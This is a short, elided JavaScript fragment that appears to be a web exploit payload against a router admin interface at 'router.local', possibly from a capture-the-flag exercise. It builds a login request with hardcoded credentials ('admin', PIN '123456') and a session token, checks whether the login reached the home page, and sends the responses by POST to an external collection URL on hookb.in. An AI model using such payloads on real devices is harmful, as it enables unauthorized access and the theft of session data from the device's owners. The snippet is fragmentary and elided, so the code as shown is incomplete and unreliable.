...
let url = cook + '&username=' + 'admin' + '&pin=' + '123456' + '&notRobot=on';
...
http.onload = function () {
    ...
    xhr.open('POST', 'https://hookb.in/pz0aM16EknCRPnrrWopa', true);
    ...
    if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
        if (http.responseURL === 'http://router.local/home.php?action=view&' + cook) {
            ...
            req.onload = function () {
                ...
                r.open('POST', 'https://hookb.in/pz0aM16EknCRPnrrWopa', true);
